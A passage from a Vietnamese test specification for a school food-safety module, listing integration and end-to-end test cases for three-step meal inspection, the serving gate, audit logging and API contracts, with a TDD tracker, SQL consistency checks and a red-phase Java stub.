  ```
- (4) → `"partnerId": "SUP-001"`, `"menuId": "MENU-2026-30"` — **code** của bảng đích, không phải UUID
- (5) → **404** (path chỉ nhận code — nhất quán, không nhận cả hai)
- FK trong DB vẫn là `UUID REFERENCES` (toàn vẹn tham chiếu không đổi)

**Expected Result (FAIL):**
- Trả UUID trong `id` ⇒ FE điều hướng/hiển thị sai; mã in trên hồ sơ pháp lý (QĐ 1246) và biên bản ký tay không dùng được UUID (D1 lý do #2)
- `partnerId` là UUID ⇒ **rủi ro rò dữ liệu chéo NCC** (D1 lý do #3) nếu sót một chỗ chuyển đổi

**Current Status:** 🔴 Not written
**Implementation Note:** đây là **thay đổi so với TDS-MF07 §5.2 hiện tại** (PK `VARCHAR`) — xem L1. Mạnh cập nhật §5.2 theo checklist cuối `00_Common_Conventions.md`.

---

#### MF07-TC-INT-017 — Compliance report đúng 5 slug

**Severity:** `MEDIUM`
**Feature Under Test:** `GET /api/v1/compliance-report`
**Test File:** `integration/ComplianceReportIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-30`
**Oracle Source:** `TDS` §14.3 nguyên văn — *"Kiểm shape compliance-report khớp mock — Expected: `["hygiene","receiving","sample-retention","supplier-certificates","three-step"]`"* + `TDS` §13 hàng `IT-07-10` + **BR-104** (điểm vệ sinh vào Báo cáo Tuân thủ) + UC-115/113/117

**Test Steps:** `GET /compliance-report` bằng `FX-022` (Medical) và `FX-023` (School Admin); trích danh sách `slug` **đã sort**.

**Expected Result (PASS):**
- Đúng **5** slug, sort: `["hygiene","receiving","sample-retention","supplier-certificates","three-step"]`
- `hygiene` lấy điểm từ `kitchen_inspections.score` (**BR-104**) — assert số khớp `FX-009`/`FX-010`
- `three-step` lấy tỉ lệ phiên `overall='PASSED'`
- Caterer → **403** (§16: `GET /compliance-report` = ❌ ở cột SERVICE CATERERS)

**Expected Result (FAIL):** thiếu/thêm slug ⇒ màn báo cáo FE gãy; và Báo cáo Tuân thủ ATTP là tài liệu gửi cơ quan chức năng nên sai cấu trúc là sai văn bản chính thức.

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-018 — Audit log đủ actor + IP cho mọi thao tác ghi

**Severity:** `HIGH`
**Feature Under Test:** audit aspect
**Test File:** `integration/AuditIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-31`
**Oracle Source:** `TDS` §14.2 nguyên văn — *"BR-170/BR-188: mọi thao tác nhạy cảm có audit kèm actor + IP"* + `ADR-M07-05` (append-only) + `TDS` §13 hàng `IT-07-12` (*"`audit_logs` ≥ 5 dòng kèm actor + IP"*)
**⚠️ Traceability:** BR-170/BR-188 **không** nằm trong cột BR của §1.7 cho MF07. Oracle là **TDS §14.2/§4.3** — ghi rõ để Huy đối chiếu, **không** nâng BR-170/188 thành BR của MF07.

**Test Steps:** chạy `MF07-TC-INT-001` (mở phiên + 3 bước + đồng ký) rồi `MF07-TC-INT-011` (biên bản) → truy vấn `audit_logs`.

**Expected Result (PASS):**
- ≥ **5** dòng cho chuỗi phiên: `CREATE`, `SUBMIT_STEP`×3, `CO_SIGN`
- Mỗi dòng có `actor` ≠ null, `ip_address` ≠ null, `occurred_at` tăng dần
- `actor` của `CO_SIGN` là người đồng ký, **không** phải người mở phiên
- Chuỗi biên bản có thêm `EXPORT_PDF`, `UPLOAD_SIGNED_RECORD`, `LOCK`
- Sau khi biên bản khoá, thay đổi ghi **thêm** dòng — **không** UPDATE dòng cũ (append-only)

**Expected Result (FAIL):** thiếu dòng `CO_SIGN` hoặc `actor` null ⇒ không truy được ai chịu trách nhiệm phê duyệt bữa ăn khi có sự cố ngộ độc — chuỗi bằng chứng MF07→MF11 bị đứt.

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-019 — overall NHẤT QUÁN với 3 cột bước (ADR-M07-02)

**Severity:** `CRITICAL`
**Feature Under Test:** tính nhất quán dữ liệu của cột lưu `overall`
**Test File:** `integration/OverallConsistencyIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-32`
**Oracle Source:** `ADR-M07-02` nguyên văn — *"Lưu `overall` + `decided_at`, tính **một lần** lúc chốt phiên… **ngoại lệ có ghi chú** so với `01_MVP_Backend_Implementation_Plan.md` §3. **Bù lại: §14 có query kiểm tra nhất quán bắt buộc chạy trước mỗi release**"* + `TDS` §14.1
**Kỹ thuật:** Constraint-based (kiểm bất biến toàn cục)

**Test Steps:**
1. Chạy toàn bộ suite integration.
2. Chạy truy vấn kiểm nhất quán.
3. Cố tạo trạng thái lệch qua `jdbc` trực tiếp → kiểm phát hiện.

**Expected Result (PASS):**
- (2) → **0 dòng**:
  ```sql
  -- overall=PASSED nhưng còn bước chưa PASSED
  SELECT code FROM inspection_sessions
   WHERE overall = 'PASSED'
     AND NOT (step1='PASSED' AND step2='PASSED' AND step3='PASSED');
  -- Expected: 0 rows

  -- overall=PASSED nhưng chưa đồng ký (BR-098)
  SELECT code FROM inspection_sessions WHERE overall='PASSED' AND co_signed_at IS NULL;
  -- Expected: 0 rows

  -- có bước FAILED mà overall không FAILED
  SELECT code FROM inspection_sessions
   WHERE (step1='FAILED' OR step2='FAILED' OR step3='FAILED') AND overall <> 'FAILED';
  -- Expected: 0 rows

  -- overall đã chốt mà thiếu decided_at
  SELECT code FROM inspection_sessions
   WHERE overall IN ('PASSED','FAILED') AND decided_at IS NULL;
  -- Expected: 0 rows
  ```
- (3) → 3 truy vấn trên **phát hiện** được dòng lệch (chứng minh truy vấn có hiệu lực, không phải luôn trả 0)
- 4 truy vấn này đưa vào **§6 Exit Criteria** — chạy trước mỗi release (đúng cam kết của ADR-M07-02)

**Expected Result (FAIL):**
- Có dòng lệch ⇒ **`overall` nói ĐẠT nhưng bước nói TRƯỢT** ⇒ `serving-gate` đọc `overall` sẽ cho phát suất trượt kiểm thực. Đây là cái giá của việc lưu cột dẫn xuất (Option A của ADR-M07-02 cảnh báo đúng), nên truy vấn này là **điều kiện đánh đổi bắt buộc**.
- Truy vấn luôn trả 0 kể cả khi có lệch ⇒ truy vấn viết sai, lưới an toàn giả

**Current Status:** 🔴 Not written

---

#### MF07-TC-INT-020 — Truy vết ngược: phiên trả kèm violations[]

**Severity:** `MEDIUM`
**Feature Under Test:** `GET /api/v1/inspections/{code}` — quan hệ ngược từ `ViolationRecord.sourceInspectionId`
**Test File:** `integration/TraceabilityIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-33`
**Oracle Source:** **BR-183** (*"truy vết ngược bản ghi kiểm thực đã nâng cấp thành biên bản"*) + `TDS` §13 hàng `IT-07-13` (*"Biên bản có `sourceInspectionId` → `GET /inspections/{id}` trả kèm `violations[]`"*) + **CF-29** (*FE **không** gửi `sourceInspectionId` — Minh bổ sung pre-fill*)

**Preconditions:** `FX-002` phiên FAILED + `FX-014` biên bản có `sourceInspectionId` trỏ phiên đó.

**Test Steps:**
1. `GET /inspections/{code phiên FAILED}` → assert.
2. Tạo biên bản **không** gửi `sourceInspectionId` (hành vi FE hiện tại) → assert.
3. `GET /violations/{code}` → assert có liên kết xuôi.

**Expected Result (PASS):**
- (1) → response có `violations: [{code:"VIO-2026-008", severity:"MEDIUM", ...}]`
- (2) → **201** (field là **optional** — CF-29), nhưng biên bản đó **không** xuất hiện trong `violations[]` của phiên nào ⇒ mất liên kết ngược. TC assert đúng hành vi này và **ghi rõ đây là gap chờ Minh pre-fill**, không phải lỗi backend.
- (3) → có `sourceInspectionId` = code phiên
- Truy vấn tìm biên bản mồ côi (đưa vào báo cáo review, không fail test):
  ```sql
  SELECT code FROM violation_records WHERE source_inspection_id IS NULL;
  -- Ghi số lượng vào báo cáo cho Minh/Huy
  ```

**Expected Result (FAIL):** không trả `violations[]` ⇒ khi điều tra sự cố, không đi từ phiên kiểm thực trượt sang biên bản vi phạm ⇒ đứt mắt của trục điều tra MF07→MF11.

**Current Status:** 🔴 Not written

---

### 4.4. E2E TEST CASES

---

#### MF07-TC-E2E-001 — Trục xương sống: kiểm thực quyết định phát suất

**Severity:** `CRITICAL`
**Feature Under Test:** `Caterer kiểm thực 3 bước ĐẠT → Teacher phát suất được` **vs** `cùng bữa nhưng phiên FAILED → Teacher KHÔNG phát được`
**Test File:** `integration/InspectionServingE2EIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-01`, `COND-08`, `COND-09`
**Oracle Source:** **BR-094** + **BR-098** + `TDS` §13 hàng `E2E-07-01` (nguyên văn) + `00_` §3 (*trục xương sống P1 nối bằng **ID***) + ràng buộc **C3** `data_model.puml`

**Preconditions:** DB sạch + seed MF01 (3 user), MF02 (`SCH-001`, lớp 3A), MF04 (`SUP-001`), MF05 (`MENU-2026-30` PUBLISHED + `dishId`), MF07 (`FX-012` checklist).

**Test Steps:**
1. Login Caterer (`FX-020`) → `POST /inspections` cho bữa trưa ngày D, khối 3.
2. Nộp đủ 3 bước, `coreTemp: 82` → đồng ký → `overall=PASSED`.
3. Login Teacher (`FX-024`) → `GET /inspections/serving-gate?date=D&meal=LUNCH` → phát suất.
4. **Nhánh âm:** bữa **phụ** cùng ngày D — nộp Bước 2 với `coreTemp: 68` → `overall=FAILED`.
5. Teacher → `serving-gate?date=D&meal=SNACK` → thử phát suất.
6. Assert liên kết bằng **ID**.

**Expected Result (PASS):**
- (3) → `allowed:true`; phát suất thành công
- (5) → `allowed:false`, `reasonCode="INSPECTION_FAILED"`; API phát suất **bị chặn**, **không** bản ghi `student_distributions` nào `status='SERVED'` cho bữa phụ ngày D
- (6) → mọi liên kết dùng **code/ID**: `inspection_sessions.menu_id` → `menus.code`; `.partner_id` → `partners.code`; `.dish_id` → `dishes.code`. Assert **không** chỗ nào join bằng **tên món** hay **nhãn bữa tiếng Việt**
- Chạy `MF07-TC-027` sau E2E → **0 vi phạm** luật `PHAT_SUAT_DU_KIEM_THUC_TRUOT`

**Expected Result (FAIL):**
- (5) phát được ⇒ **suất ăn trượt kiểm thực tới tay học sinh** — hậu quả nghiêm trọng nhất của hệ thống; và `semantic-audit.ts` §7 sẽ đỏ
- Join bằng tên món ⇒ đổi tên món là đứt truy xuất (vi phạm `00_` §5 *"món tham chiếu `dishId` không phải tên"*)

**Current Status:** 🔴 Not written
**Implementation Note:** TC này **cần Minh** gỡ lọc client-side ở màn phát suất (L17) — trước đó nhánh (5) không thể xanh qua đường FE thật.

---

#### MF07-TC-E2E-002 — Từ bước trượt đến biên bản đã khoá

**Severity:** `HIGH`
**Feature Under Test:** `Bước 2 trượt → CAPA tự tạo (MF11) → Medical Staff lập biên bản với sourceInspectionId → export PDF → upload ảnh ký → khoá`
**Test File:** `integration/ViolationFromInspectionE2EIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-06`, `COND-12`, `COND-15`, `COND-33`
**Oracle Source:** `TDS` §13 hàng `E2E-07-02` (nguyên văn) + **BR-095**, **BR-183**, **BR-211** + **MSG-086**, **MSG-095**

**Test Steps:**
1. Caterer nộp Bước 2 `coreTemp: 68` → `step2=FAILED`.
2. Assert CAPA tự tạo (không gọi API CAPA nào).
3. Login Medical Staff → `POST /violations` với `sourceInspectionId` = code phiên, `caterersRepresentativeId`, mô tả + ảnh.
4. `POST /violations/{code}/export-pdf`.
5. `POST /violations/{code}/signed-record`.
6. `PUT {"resolution":"PENDING_APPROVAL"}`.
7. `GET /inspections/{code}` → assert `violations[]`.
8. Thử sửa nội dung biên bản đã khoá.

**Expected Result (PASS):**
- (2) → 1 CAPA với `source_inspection_code`
- (3) → **201**, MSG-086; **không** có field cá nhân deprecated (L11)
- (4) → PDF server-side hợp lệ theo mẫu `specialreport2173_1.md`
- (5) → `locked:true`, có `sha256`
- (6) → **200** (đã có ảnh ký; nếu bỏ bước 5 thì phải **409 VIO-095**)
- (7) → phiên trả kèm biên bản đó (truy vết ngược BR-183)
- (8) → **409** (append-only), `audit_logs` có dòng ghi nhận nỗ lực sửa
- ⚠️ **Ranh giới:** bước phê duyệt tiếp theo (`resolution → APPROVED` bởi School Admin, BR-186) thuộc **MF11 UC-182** — E2E này **dừng ở PENDING_APPROVAL**, không test tiếp (L10/CF-6)

**Expected Result (FAIL):**
- (2) không CAPA ⇒ bước trượt không ai khắc phục (L12)
- (6) qua được khi bỏ bước 5 ⇒ gate MSG-095 chỉ ở client (L22)
- (7) không có liên kết ⇒ đứt trục điều tra

**Current Status:** 🔴 Not written

---

#### MF07-TC-E2E-003 — Hợp đồng FE↔BE: đổi baseURL là chạy

**Severity:** `HIGH`
**Feature Under Test:** shape response của 6 resource MF07 vs `mock-server.ts`
**Test File:** `integration/ContractSnapshotIT.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-22`, `COND-23`, `COND-27`
**Constraint Ref:** `TDS §17.1 C12` *(phần tên field)* + **D3/D4/D6**
**Oracle Source:** `TDS` §9 mở đầu (*liệt kê đúng những gì FE đang gọi để "đổi `baseURL` là chạy"*) + §17.1 **C12** (17 tên field bất biến) + `TDS` §14.3 + **D3** (`baseURL: "/api/v1"`) + **D4**/**D6** (ghi đè phần định dạng của C12 — L3/L4)
**Kỹ thuật:** Contract Testing (snapshot **khoá**, bỏ qua giá trị)

**Test Steps:**
1. Gọi `GET` cho `inspections`, `inspections/{code}`, `kitchen-inspections`, `checklist-groups`, `violations`, `safety-signoffs`, `compliance-report`.
2. Trích **tập khoá** JSON (đệ quy) mỗi response.
3. So với snapshot khoá xuất từ `mock-server.ts` (`src/test/resources/contracts/mf07-mock-keys.json` — Minh cập nhật khi mock đổi).
4. Kiểm định dạng giá trị theo D4/D6.

**Expected Result (PASS):**
- Tập khoá backend ⊇ tập khoá mock — **không thiếu** khoá nào
- Có đủ 17 tên field C12: `meal`, `step1`, `step2`, `step3`, `overall`, `coreTemp`, `dish`, `evidencePhotos`, `staffNotes`, `formHeader`, `step1Fresh`, `step1Dry`, `step2Rows`, `step3Rows`, `itemFindings`, `itemResults`, `confirmStatus`, `signedRecordFiles`
- `overall` chấp nhận cả **`IN_PROGRESS`** (CF-23)
- 5 khoá phân trang đúng; **không** wrapper
- **D4:** `date` khớp `^\d{4}-\d{2}-\d{2}$`; `occurredAt`/`signedAt`/`pdfGeneratedAt` khớp ISO instant — **không** `dd/MM/yyyy`
- **D6:** `meal` ∈ `{BREAKFAST, LUNCH, SNACK}`
- **D3:** mọi path dưới `/api/v1`

**Expected Result (FAIL):**
- Thiếu/đổi tên khoá ⇒ **22 file FE gãy** — TC này là hàng rào chống hồi quy hợp đồng, chạy **mỗi PR**
- Ngày `dd/MM/yyyy` hoặc `meal` tiếng Việt ⇒ vi phạm D4/D6 (đã Approved) và MF07 thành ngoại lệ duy nhất trong 13 module

**Current Status:** 🔴 Not written
**Implementation Note:** snapshot chỉ so **khoá**, không so **giá trị**. ⚠️ Vì D4/D6 đổi **định dạng giá trị** (không đổi khoá), snapshot khoá vẫn khớp — nên phần kiểm định dạng ở bước (4) là **bắt buộc**, không thể thay bằng so khoá.

---

## 5. Red-Green-Refactor Tracker

> Cột 🟢 GREEN điền **commit hash** khi test xanh. Không điền trước khi Red Gate (§5.4) PASS.

### 5.1. Unit (28)

| TC ID | Test File | 🔴 RED | 🟢 GREEN | 🔵 REFACTOR note |
|-------|-----------|--------|----------|------------------|
| `MF07-TC-001` | `service/ThreeStepFlowTest.java` | `[ ]` | | tách `StepOrderPolicy` dùng chung 3 bước |
| `MF07-TC-002` | `service/ThreeStepFlowTest.java` | `[ ]` | | gộp TC-001/002 thành `@ParameterizedTest` bảng thứ tự |
| `MF07-TC-003` | `service/Step2ValidatorTest.java` | `[ ]` | | |
| `MF07-TC-004` | `service/Step2ValidatorTest.java` | `[ ]` | | hằng `MIN_CORE_TEMP_C=75` dùng chung service + CHECK |
| `MF07-TC-005` | `service/Step3ValidatorTest.java` | `[ ]` (disabled) | | ⚠️ `@Disabled` — chờ CF-24/L19 |
| `MF07-TC-006` | `service/Step1ValidatorTest.java` | `[ ]` | | ⚠️ chờ Huy chốt ranh giới "hết hạn đúng ngày" |
| `MF07-TC-007` | `service/EvidenceValidatorTest.java` | `[ ]` | | ✅ 4 cột `fail_*` chính thức hoá 03/08 (BR-095 + BR-183). Expected message: **MSG-148** nguyên văn |
| `MF07-TC-008` | `service/InspectionCapaTest.java` | `[ ]` | | idempotency key thành value object |
| `MF07-TC-009` | `service/ReinspectionTest.java` | `[ ]` | | ⚠️ endpoint mới (L16) |
| `MF07-TC-010` | `service/ServingApprovalTest.java` | `[ ]` | | bảng 5 hàng → `@MethodSource` |
| `MF07-TC-011` | `service/ChecklistScoringServiceTest.java` | `[ ]` | | ghi công thức điểm vào TDS §5.2 |
| `MF07-TC-012` | `service/KitchenInspectionServiceTest.java` | `[ ]` | | |
| `MF07-TC-013` | `service/KitchenInspectionServiceTest.java` | `[ ]` | | ngưỡng 60 là hằng cấu hình (chưa có căn cứ pháp lý) |
| `MF07-TC-014` | `service/ServingGateDecisionTest.java` | `[ ]` | | FSM gate thành `EnumMap` một chỗ |
| `MF07-TC-015` | `service/ChecklistScoringServiceTest.java` | `[ ]` | | |
| `MF07-TC-016` | `service/ChecklistLifecycleTest.java` | `[ ]` | | ⚠️ khớp với TestSpec-MF12 khi có |
| `MF07-TC-017` | `service/ViolationRecordLifecycleTest.java` | `[ ]` | | tách `PdfRenderer` để test byte-level |
| `MF07-TC-018` | `service/RepeatViolationDetectionTest.java` | `[ ]` | | ⚠️ nội dung MSG-088 lỗi thời — Huy cập nhật |
| `MF07-TC-019` | `service/ViolationRecordCreateTest.java` | `[ ]` | | danh sách field deprecated thành hằng |
| `MF07-TC-020` | `service/ViolationSignedRecordGateTest.java` | `[ ]` | | gate ở service để MF11 dùng chung |
| `MF07-TC-021` | `service/ManualTempAlertTest.java` | `[ ]` | | |
| `MF07-TC-022` | `service/MedicalReviewFieldTest.java` | `[ ]` | | ⚠️ CF-10 — chưa có BR/UC nguồn |
| `MF07-TC-023` | `service/KitchenConfirmTest.java` | `[ ]` | | ⚠️ CF-10 + màn FE chưa code |
| `MF07-TC-024` | `mapper/DateFormatContractTest.java` | `[ ]` | | converter dùng chung ở `common/` (Nam) |
| `MF07-TC-025` | `mapper/MealTypeContractTest.java` | `[ ]` | | enum ở `common/enums/` (Nam), không khai lại |
| `MF07-TC-026` | `service/CodePolicyTest.java` | `[ ]` | | `code_sequences` + `INSERT…RETURNING` |
| `MF07-TC-027` | `service/ServingConsistencyTest.java` | `[ ]` | | truy vấn vào Exit Criteria |
| `MF07-TC-028` | `service/PartialMergeTest.java` | `[ ]` | | `JsonNullable<T>` cho toàn bộ DTO update |

### 5.2. Security (16)

| TC ID | Test File | 🔴 RED | 🟢 GREEN | 🔵 REFACTOR note |
|-------|-----------|--------|----------|------------------|
| `MF07-TC-SEC-001` | `web/InspectionSecurityTest.java` | `[ ]` | | danh sách 29 endpoint dùng chung SEC-002/007 |
| `MF07-TC-SEC-002` | `web/InspectionAuthorizationMatrixTest.java` | `[ ]` | | |
| `MF07-TC-SEC-003` | `web/InspectionSecurityTest.java` | `[ ]` | | |
| `MF07-TC-SEC-004` | `web/InspectionSecurityTest.java` | `[ ]` | | |
| `MF07-TC-SEC-005` | `web/RowLevelAccessTest.java` | `[ ]` | | rút `PartnerScopeGuard` dùng lại MF04/MF06 |
| `MF07-TC-SEC-006` | `web/RowLevelAccessTest.java` | `[ ]` | | thêm `schoolId`/`partnerId` vào nhóm key bị loại |
| `MF07-TC-SEC-007` | `web/InspectionAuthorizationMatrixTest.java` | `[ ]` | | 203 tổ hợp — `@MethodSource` |
| `MF07-TC-SEC-008` | `web/FieldLevelAuthorizationTest.java` | `[ ]` | | 6 nhóm field §16 thành enum `FieldGroup` |
| `MF07-TC-SEC-009` | `web/FieldLevelAuthorizationTest.java` | `[ ]` | | Oracle: **BR-221 + BR-222** (cấp 03/08). Gỡ ghi chú "ranh giới MF11" — nhóm field này chưa bao giờ thuộc MF11 |
| `MF07-TC-SEC-010` | `web/EvidenceAccessTest.java` | `[ ]` | | |
| `MF07-TC-SEC-011` | `web/ViolationPrivacyTest.java` | `[ ]` | | |
| `MF07-TC-SEC-012` | `web/SignedRecordIntegrityTest.java` | `[ ]` | | |
| `MF07-TC-SEC-013` | `web/InspectionImmutabilityTest.java` | `[ ]` | | chốt 405 hay 403 → ghi vào TDS §9.2 |
| `MF07-TC-SEC-014` | `web/ViolationGateBypassTest.java` | `[ ]` | | ⛔ `@Disabled("Chuyển MF11 — M07-D07")` |
| `MF07-TC-SEC-015` | `web/ServingGateSoleEntryTest.java` | `[ ]` | | ⚠️ cần Minh gỡ lọc client-side (L17) |
| `MF07-TC-SEC-016` | `web/ViolationSanitizeTest.java` | `[ ]` | | ⛔ `@Disabled("Chuyển MF11 — M07-D07")`. OWASP Java HTML Sanitizer, allow-list vào TDS **của MF11** |
| **`MF07-TC-SEC-017`** 🆕 | `web/RoleFieldParityTest.java` | `[ ]` | | **D11 bắt buộc** (`M07-D13`). So `JsonNode.fieldNames()`, không so chuỗi JSON. Dùng **tài khoản seed thật** (`U-0001/0002/0003/9001`), không `@WithMockUser` |
| **`MF07-TC-029`** 🆕 | `integration/DerivedFieldRejectionIT.java` | `[ ]` | | **D12 bắt buộc** (`M07-D14`). Field dẫn xuất phải **vắng mặt** khỏi Request DTO — **không** dùng `@JsonIgnore` (nó im lặng bỏ qua, đúng bẫy đang chặn) |

> **Security: 16 → 17 dòng, 15 chạy** (`SEC-014`/`SEC-016` `@Disabled` sang MF11).

### 5.3. Integration + E2E (23)

| TC ID | Test File | 🔴 RED | 🟢 GREEN | 🔵 REFACTOR note |
|-------|-----------|--------|----------|------------------|
| `MF07-TC-INT-001` | `integration/InspectionLifecycleIT.java` | `[ ]` | | |
| `MF07-TC-INT-002` | `integration/ServingGateIT.java` | `[ ]` | | ⚠️ endpoint mới (L17) |
| `MF07-TC-INT-003` | `integration/ServingGateIT.java` | `[ ]` | | 4 `reasonCode` → enum |
| `MF07-TC-INT-004` | `integration/RowLevelScopeIT.java` | `[ ]` | | |
| `MF07-TC-INT-005` | `integration/PaginationContractIT.java` | `[ ]` | | dùng lại cho 12 module (nền chung Nam) |
| `MF07-TC-INT-006` | `integration/PartialMergeIT.java` | `[ ]` | | |
| `MF07-TC-INT-007` | `integration/InspectionFilterIT.java` | `[ ]` | | index cho `SEARCH_FIELDS` nếu `EXPLAIN` xấu |
| `MF07-TC-INT-008` | `integration/InspectionCapaIT.java` | `[ ]` | | đổi sang outbox khi MF11 tách service |
| `MF07-TC-INT-009` | `integration/KitchenInspectionIT.java` | `[ ]` | | |
| `MF07-TC-INT-010` | `integration/ChecklistLifecycleIT.java` | `[ ]` | | |
| `MF07-TC-INT-011` | `integration/ViolationLifecycleIT.java` | `[ ]` | | ⛔ `@Disabled("Chuyển MF11 — M07-D07")` |
| `MF07-TC-INT-012` | `integration/DbConstraintIT.java` | `[ ]` | | sinh CHECK từ cùng hằng với service |
| `MF07-TC-INT-013` | `integration/DbConstraintIT.java` | `[ ]` | | ⚠️ regression guard — chống bật constraint sớm |
| `MF07-TC-INT-014` | `integration/ReinspectionIT.java` | `[ ]` | | |
| `MF07-TC-INT-015` | `integration/SchemaShapeIT.java` | `[ ]` | | nhắc Mạnh cập nhật `data_model.puml` (L8) |
| `MF07-TC-INT-016` | `integration/IdentityContractIT.java` | `[ ]` | | ⚠️ **D1** — TDS §5.2 cần cập nhật (L1) |
| `MF07-TC-INT-017` | `integration/ComplianceReportIT.java` | `[ ]` | | |
| `MF07-TC-INT-018` | `integration/AuditIT.java` | `[ ]` | | audit aspect ở `common/` (Nam) |
| `MF07-TC-INT-019` | `integration/OverallConsistencyIT.java` | `[ ]` | | 4 truy vấn vào script pre-release |
| `MF07-TC-INT-020` | `integration/TraceabilityIT.java` | `[ ]` | | ⚠️ gap CF-29 chờ Minh pre-fill |
| `MF07-TC-E2E-001` | `integration/InspectionServingE2EIT.java` | `[ ]` | | CI nightly (chậm) |
| `MF07-TC-E2E-002` | `integration/ViolationFromInspectionE2EIT.java` | `[ ]` | | CI nightly |
| `MF07-TC-E2E-003` | `integration/ContractSnapshotIT.java` | `[ ]` | | chạy **mỗi PR** — hàng rào hợp đồng |

### 5.4. Red Gate Protocol (CASE 2.0 — GATE-2)

> ⭐ **Gate QUAN TRỌNG NHẤT.** Trước khi implement, chạy toàn bộ suite với stub **ném exception**. Mọi test PHẢI **FAIL**. Test PASS ngay → **AP-AI-002 (Green-from-Birth)** → reject và rewrite.

**Stub cho Red Phase (Java):**

```java
package com.sfms.mf07.service.impl;

import com.sfms.mf07.service.*;
import org.springframework.context.annotation.Profile;
import org.springframework.stereotype.Service;

/**
 * RED PHASE STUB — mọi method ném. Chứng minh test đang thật sự kiểm hành vi.
 * Xoá trước khi merge (§7 bước 5).
 */
@Service
@Profile("red-gate")
public class InspectionSessionServiceRedStub implements InspectionSessionService {

    private static final String MSG = "Not implemented — Red Phase stub";

    @Override public InspectionResponse openSession(OpenSessionRequest r, String actor) {
        throw new UnsupportedOperationException(MSG);
    }
    @Override public InspectionResponse submitStep(String code, int step, StepPayload p, String actor) {
        throw new UnsupportedOperationException(MSG);
    }
    @Override public InspectionResponse reinspect(String code, String actor) {
        throw new UnsupportedOperationException(MSG);
    }
}

/** Gate BR-094 — stub PHẢI ném, KHÔNG được trả allowed=false mặc định (xem bẫy #1). */
@Service
@Profile("red-gate")
class ServingApprovalServiceRedStub implements ServingApprovalService {
    @Override public ServingGateResponse gate(java.time.LocalDate date, MealType meal) {
        throw new UnsupportedOperationException("Not implemented — Red Phase stub");
    }
}
```

```bash
# Chạy Red Gate
mvn test -Dspring.profiles.active=red-gate -Dtest='com.sfms.mf07.**' \
         2>&1 | tee target/red-gate-evidence.log

grep -E "Tests run:.*Failures" target/red-gate-evidence.log
```

**Red Gate Verification:**

| Nhóm TC | Stub Result | Expected | Actual | Root Cause (nếu PASS bất thường) |
|-------|-------------|----------|--------|----------------------------------|
| `TC-001…028` (unit) | `throw UnsupportedOperationException` | 🔴 FAIL (26/28, trừ 2 `@Disabled`) | ☐ FAIL ☐ PASS | ☐ Tautology ☐ Shared state ☐ Assert quá yếu ☐ Hallucinated contract |
| `TC-SEC-001…016` | filter chain rỗng | 🔴 FAIL (16/16) | ☐ FAIL ☐ PASS | ☐ Test chỉ assert `status != 500` |
| `TC-INT-001…020` | controller trả `501` | 🔴 FAIL (20/20) | ☐ FAIL ☐ PASS | ☐ Không assert DB, chỉ assert HTTP |
| `TC-E2E-001…003` | như trên | 🔴 FAIL (3/3) | ☐ FAIL ☐ PASS | |

**Bẫy Red Gate riêng của MF07 — kiểm THỦ CÔNG (bắt buộc):**

| # | Bẫy | Vì sao dễ PASS giả | Cách chống |
|---|---|---|---|
| **1** | **`serving-gate` (TC-INT-003, TC-014)** — ca chặn | Stub trả `allowed=false` hoặc chưa implement → **mọi ca chặn PASS ngay**. Đây là bẫy nguy hiểm nhất của module: test "gate chặn" xanh giả trong khi gate chưa tồn tại. | Mỗi test bảng quyết định **phải có ≥ 1 ca `allowed=true`** trong cùng method; và assert **`reasonCode` chính xác**, không chỉ `allowed==false`. Stub phải **ném**, không trả `false`. |
| **2** | **Ngưỡng nhiệt độ (TC-003, TC-004, TC-005)** | Nếu chỉ assert "ném exception", stub `UnsupportedOperationException` cũng PASS | Assert đúng loại (`LowCoreTempException`) **và** `$.error.code == "INSP-017"` **và** `step2 == FAILED` được **ghi lại** |
| **3** | **`TC-SEC-001` (401)** | Spring Security chưa cấu hình ⇒ mọi request 401 sẵn ⇒ PASS mà chưa có gì | Thêm assert **đối chứng**: cùng endpoint **có** JWT hợp lệ phải trả ≠ 401 |
| **4** | **`TC-INT-015` / `TC-INT-013`** (bảng/constraint **không** tồn tại) | DB trống ⇒ "không tồn tại" đúng tự nhiên ⇒ PASS vô nghĩa | Thêm assert **đối chứng dương**: bảng `inspection_sessions` **có** tồn tại và constraint `ck_s1f_evidence` **có** tồn tại trong cùng test |
| **5** | **`TC-INT-019`** (4 truy vấn nhất quán trả 0 dòng) | DB trống ⇒ luôn 0 dòng ⇒ PASS | Bước (3) của TC **bắt buộc**: cố tạo dòng lệch qua `jdbc` rồi assert truy vấn **phát hiện được** |
| **6** | **`TC-INT-006` / `TC-028`** (partial merge) | "Field giữ nguyên" có thể do **chưa implement gì cả** | Assert **hai chiều** trong cùng test: field **được gửi** đã đổi **và** field **không gửi** giữ nguyên |
| **7** | **`TC-SEC-015`** (static check `grep` không kết quả) | Package `com.sfms.serving` chưa tồn tại ⇒ grep rỗng ⇒ PASS | Assert package **có** tồn tại trước khi grep; nếu chưa có MF09 thì đánh dấu **blocked**, không PASS |

**Red Gate Evidence:**

- Stub commit hash: `___`
- Tất cả FAIL? ☐ Yes → **GATE-2 PASS** (T2→T3) → tiếp tục implement
- Log: `target/red-gate-evidence.log`
- **7 bẫy trên đã kiểm thủ công?** ☐ Yes (người kiểm: `_______`, ngày: `______`)

> **Nếu bất kỳ test PASS:** dừng lại, xác định root cause, rewrite test từ TC-ID spec với Fixture Isolation Pattern (§4).

---

## 6. Entry / Exit Criteria

### Entry Criteria (điều kiện bắt đầu viết test)

- [ ] `TDS-MF07_Backend.md` đã **Approved** — hiện `Draft`
- [ ] **TDS-MF07 đã được cập nhật theo `00_Common_Conventions.md` D1–D7** (checklist cuối file đó): §5.2 có `code` + PK UUID; §9.2 path `{code}`, ngày ISO, không `@JsonFormat`; §9.2 dùng enum D6; §10 ghi envelope D2. ⚠️ **Nếu chưa, TestSpec này vẫn đúng** (D1–D7 ưu tiên cao hơn) nhưng phải ghi vào biên bản review để Mạnh xử lý — xem **L1–L4**
- [ ] **Nút cổ chai `00_` §4b:** MF01 (auth/JWT/RBAC) + MF02 (`PagedResponse`, `Specification`) chạy được
